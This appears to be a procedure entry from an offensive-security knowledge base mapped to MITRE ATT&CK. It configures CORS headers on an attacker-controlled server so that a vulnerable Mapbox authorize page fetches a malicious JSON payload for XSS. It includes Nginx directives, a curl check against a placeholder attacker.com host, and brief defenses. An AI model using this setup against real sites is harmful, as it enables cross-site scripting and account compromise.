---
id: proc-configure-cors
tags:
  - cors
  - cross-origin
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T00:11:09.183Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Configure-Server-CORS-for-Cross-Origin-Access

## Summary

This procedure sets up CORS headers on the attacker's HTTPS server to permit cross-origin resource sharing from https://www.mapbox.com, allowing the vulnerable authorize page to fetch the malicious JSON without browser blocking.

## Description

Browsers enforce same-origin policy, preventing www.mapbox.com from fetching resources from attacker domains unless CORS headers explicitly allow it. By setting Access-Control-Allow-Origin to https://www.mapbox.com, Access-Control-Allow-Credentials: true, and Access-Control-Allow-Headers: x-requested-with, the fetch succeeds, delivering the JSON payload for XSS injection. This is crucial as the auth endpoint response is processed client-side.

## Requirements

1. Control over the web server hosting the JSON (e.g., Nginx, Apache).
2. Ability to modify server configuration for response headers.
3. HTTPS enforcement for secure contexts.

## Defense

Defensive measures and detection strategies:

- Avoid overly permissive CORS policies; use specific origins only.
- Log and alert on CORS header configurations for external domains.
- Use strict CSP to limit fetch sources on sensitive pages.
- Monitor network traffic for unexpected cross-origin requests to unknown domains.

## Objectives

1. Bypass browser CORS restrictions for payload delivery.
2. Ensure credentials and custom headers are allowed if needed.
3. Facilitate seamless JSON fetch from the target domain.

## Instructions

### Step 1: Modify Server Configuration

**Context**: Add CORS headers to all responses from the JSON endpoint to whitelist www.mapbox.com as an allowed origin.

For Nginx, add to server block:

```nginx
add_header 'Access-Control-Allow-Origin' 'https://www.mapbox.com' always;
add_header 'Access-Control-Allow-Credentials' 'true' always;
add_header 'Access-Control-Allow-Headers' 'x-requested-with' always;
```

> Restart the server (e.g., nginx -s reload). For Apache, use Header directives in .htaccess or config.

### Step 2: Test CORS Configuration

**Context**: Verify headers are applied by simulating a cross-origin request.

Use browser dev tools or curl with --header to check response:

```bash
curl -H 'Origin: https://www.mapbox.com' -H 'Access-Control-Request-Method: GET' https://attacker.com/mapbox/oauth.json
```

> Expect the JSON response with the added CORS headers in the output.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- cors
- headers
- server-config
